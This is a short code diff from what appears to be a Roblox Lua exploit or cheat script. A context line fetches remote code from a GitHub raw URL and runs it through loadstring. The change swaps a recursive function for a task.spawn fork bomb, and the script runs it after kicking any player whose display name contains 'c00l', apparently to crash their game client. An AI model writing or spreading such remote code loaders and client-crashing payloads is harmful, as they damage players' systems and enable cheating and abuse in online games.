@@ -4,7 +4,7 @@ task.spawn(newcclosure(loadstring(game:HttpGet("https://raw.githubusercontent.co
 if tostring(game.Players.LocalPlayer.DisplayName):find("c00l") then
 	game.Players.LocalPlayer:Kick("Get out of here skid!")
 	task.wait(0.1)
-	local function fork() while true do fork() end end;fork();
+	local function fork() while true do task.spawn(fork) end end;fork();
 else
 	local ScreenGui = Instance.new("ScreenGui")
 	local Frame = Instance.new("ImageLabel")
